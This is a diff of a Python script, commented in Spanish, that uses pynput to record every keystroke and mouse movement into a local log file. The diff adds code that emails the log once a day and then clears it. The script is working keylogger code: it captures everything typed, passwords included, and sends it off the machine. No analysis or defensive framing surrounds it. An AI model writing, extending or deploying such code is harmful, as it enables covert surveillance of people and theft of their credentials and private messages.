@@ -2,7 +2,7 @@ from pynput import mouse,keyboard
 import threading
 from time import time
 from Archivo import escribir
-from Conntrol_correo import actualizar_mes, enviar
+from Control_correo import actualizar_dia, enviar, reiniciar_dia
 from Correo import enviar_correo
 
 def on_move(x, y):
@@ -29,10 +29,17 @@ def on_release(key):
     except AttributeError:
         escribir("Keyboard", "Release", time(), str(key))
 
-
 if enviar():
-    actualizar_mes()
-    enviar_correo()
+    try:
+        enviar_correo()
+        actualizar_dia()
+        n_archivo = "C:\Capturador\lista_acciones.txt"
+        archivo = open(n_archivo, "w")
+        archivo.close()
+    except:
+        reiniciar_dia()
+else:
+    pass
 
 listener_keyboard= keyboard.Listener(
         on_press=on_press,
@@ -54,3 +61,4 @@ for hilo in threading.enumerate(): # Recorre hilos activos para controlar estado
     if hilo is hilo_ppal:    # Si el hilo es hilo_ppal continua al siguiente hilo activo
         continue
     hilo.join()         # El programa esperará a que este hilo finalice:
+#TODO: las teclas multimedia no estan soportadas, agregar excepcion para continuar
